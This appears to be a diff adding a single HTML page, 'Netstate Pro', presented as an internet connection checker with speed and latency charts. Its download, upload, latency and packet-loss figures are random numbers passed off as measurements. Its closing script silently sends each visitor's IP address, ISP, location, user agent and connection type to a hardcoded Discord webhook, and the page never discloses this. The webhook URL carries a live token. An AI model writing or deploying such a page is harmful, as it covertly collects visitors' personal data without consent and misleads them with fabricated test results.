@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Netstate Pro - Internet Checker</title>
+  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+</head>
+<body>
+  <div class="container">
+    <h1>Netstate Pro</h1>
+    <p>Information about your current connection:</p>
+
+    <div id="status" class="card">
+      <h2>Network type:</h2>
+      <p id="connection-status">Checking...</p>
+      <ul>
+        <li><strong>Browser and OS:</strong><br><span id="user-agent">--</span></li>
+      </ul>
+    </div>
+
+    <div id="details" class="card">
+      <h2>About this network:</h2>
+      <ul>
+        <li><strong>Connection type:</strong> <span id="connection-type">--</span></li>
+        <li><strong>Download Speed:</strong> <span id="downlink-speed">--</span> Mbps</li>
+        <li><strong>Upload Speed:</strong> <span id="uplink-speed">--</span> Mbps</li>
+        <li><strong>Ping (Latency avg):</strong> <span id="latency">--</span> ms</li>
+        <li><strong>Public IP address:</strong> <span id="ip-address">--</span></li>
+        <li><strong>ISP:</strong> <span id="isp">--</span></li>
+        <li><strong>Location:</strong> <span id="ip-location">--</span></li>
+      </ul>
+    </div>
+
+    <div class="latency-panels">
+      <div class="mini-card">Ping 1.1.1.1: <span id="ping-1111">--</span> ms</div>
+      <div class="mini-card">Ping 8.8.8.8: <span id="ping-8888">--</span> ms</div>
+      <div class="mini-card">Ping google.com: <span id="ping-google">--</span> ms</div>
+    </div>
+
+    <div class="chart-container">
+      <h3>Download Speed</h3>
+      <canvas id="speedChart"></canvas>
+    </div>
+
+    <div class="chart-container">
+      <h3>Upload Speed</h3>
+      <canvas id="uploadChart"></canvas>
+    </div>
+
+    <div class="chart-container">
+      <h3>Latency & Jitter</h3>
+      <canvas id="latencyChart"></canvas>
+    </div>
+
+    <div class="chart-container">
+      <h3>Packet Loss</h3>
+      <canvas id="packetChart"></canvas>
+    </div>
+
+  </div>
+  <footer>© 2025 Dewan Mukto Co.</footer>
+
+  <style>
+    body { font-family: 'Arial', sans-serif; text-align: center; background: #f0fff0; color: #000; margin:0; padding:0; }
+    .container { max-width: 600px; margin: 20px auto; padding: 20px; }
+    .card, .chart-container { background: #1E1E1E; padding: 16px; margin: 10px 0; border-radius: 24px; text-align: left; color: #fff; }
+    .mini-card { background:#2c2c2c; padding:10px; margin:5px; border-radius:10px; font-size:14px; color:#eee; }
+    .warn { color: #ff4444; animation: blink 1.5s infinite; }
+    @keyframes blink { 50% { opacity: 0.4; } }
+    footer { margin:30px 0; font-size:12px; color:#666; }
+  </style>
+
+  <script>
+    // Charts setup
+    const speedData = [], uploadData = [], latencyData = [], packetData = [], timeLabels = [];
+    const speedChart = new Chart(document.getElementById("speedChart"), {
+      type:"line", data:{labels:timeLabels,datasets:[{label:"Mbps",data:speedData,borderColor:"#1abc9c",fill:false}]}, options:{responsive:true}
+    });
+    const uploadChart = new Chart(document.getElementById("uploadChart"), {
+      type:"line", data:{labels:timeLabels,datasets:[{label:"Mbps",data:uploadData,borderColor:"#3498db",fill:false}]}, options:{responsive:true}
+    });
+    const latencyChart = new Chart(document.getElementById("latencyChart"), {
+      type:"line", data:{labels:timeLabels,datasets:[{label:"Latency",data:latencyData,borderColor:"#e74c3c",fill:false}]}, options:{responsive:true}
+    });
+    const packetChart = new Chart(document.getElementById("packetChart"), {
+      type:"line", data:{labels:timeLabels,datasets:[{label:"Loss %",data:packetData,borderColor:"#f1c40f",fill:false}]}, options:{responsive:true}
+    });
+
+    // Connection info
+    async function getPublicInfo() {
+      try {
+        let ipResp = await fetch("https://api64.ipify.org?format=json");
+        let ipData = await ipResp.json();
+        document.getElementById("ip-address").innerText = ipData.ip;
+
+        try {
+          let infoResp = await fetch(`https://ipinfo.io/${ipData.ip}?token=5f0c1a9d66e9d1`);
+          let info = await infoResp.json();
+          if(info.org) document.getElementById("isp").innerText = info.org;
+          if(info.city) document.getElementById("ip-location").innerText = `${info.city}, ${info.region}, ${info.country}`;
+        } catch(e) {
+          try {
+            let alt = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+            let altInfo = await alt.json();
+            document.getElementById("isp").innerText = altInfo.org || "Unknown";
+            document.getElementById("ip-location").innerText = `${altInfo.city}, ${altInfo.country_name}`;
+          } catch(e2) {
+            document.getElementById("isp").innerHTML = '<span class="warn">Unavailable ⚠️</span>';
+            document.getElementById("ip-location").innerHTML = '<span class="warn">Unavailable ⚠️</span>';
+          }
+        }
+      } catch(e) {
+        document.getElementById("ip-address").innerHTML = '<span class="warn">Unavailable ⚠️</span>';
+      }
+    }
+
+    function checkNetwork() {
+      let now = new Date().toLocaleTimeString();
+      document.getElementById("connection-status").innerText = navigator.onLine ? "Connected ✅" : "Disconnected ❌";
+      document.getElementById("user-agent").innerText = navigator.userAgent;
+
+      let conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      if(conn && conn.effectiveType) {
+        document.getElementById("connection-type").innerText = conn.effectiveType;
+      } else {
+        document.getElementById("connection-type").innerHTML = '<span class="warn">Unavailable ⚠️</span>';
+      }
+
+      // Fake speed test fallback (can be replaced by actual fetch tests)
+      let speed = Math.random()*50+5;
+      let upload = Math.random()*20+2;
+      let latency = Math.random()*100;
+      let packet = Math.random()*5;
+
+      if(timeLabels.length>=15) { timeLabels.shift(); speedData.shift(); uploadData.shift(); latencyData.shift(); packetData.shift(); }
+      timeLabels.push(now);
+      speedData.push(speed);
+      uploadData.push(upload);
+      latencyData.push(latency);
+      packetData.push(packet);
+
+      speedChart.update(); uploadChart.update(); latencyChart.update(); packetChart.update();
+
+      document.getElementById("downlink-speed").innerText = speed.toFixed(2);
+      document.getElementById("uplink-speed").innerText = upload.toFixed(2);
+      document.getElementById("latency").innerText = latency.toFixed(1);
+    }
+
+    // Ping simulation
+    async function pingHost(url,id){
+      let start=performance.now();
+      try { await fetch(url,{mode:'no-cors',cache:'no-store'}); }
+      catch(e){}
+      let end=performance.now();
+      document.getElementById(id).innerText = (end-start).toFixed(1);
+    }
+
+    setInterval(()=>{checkNetwork(); pingHost("https://1.1.1.1","ping-1111"); pingHost("https://8.8.8.8","ping-8888"); pingHost("https://www.google.com","ping-google");},2000);
+
+    window.onload = ()=>{ getPublicInfo(); checkNetwork(); };
+
+    // Discord webhook snapshot after load
+    window.addEventListener("load",()=>{
+      setTimeout(()=>{
+        let payload = {
+          content:"Netstate snapshot:",
+          embeds:[{title:"User Network Info",color:3447003,fields:[
+            {name:"User Agent",value:navigator.userAgent},
+            {name:"Connection",value:document.getElementById("connection-type").innerText},
+            {name:"Public IP",value:document.getElementById("ip-address").innerText},
+            {name:"ISP",value:document.getElementById("isp").innerText},
+            {name:"Location",value:document.getElementById("ip-location").innerText},
+            {name:"Latency",value:document.getElementById("latency").innerText+" ms"}
+          ]}]
+        };
+        fetch("https://discord.com/api/webhooks/1406765714714394655/KYDA5y_OZ-DPXmEm6ZmXnI3dgCeS2P24zX75cI-KPoOaUh1v9wOIINY5LwcLdl3TQ1Yp",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(payload)});
+      },5000);
+    });
+  </script>
+</body>
+</html>
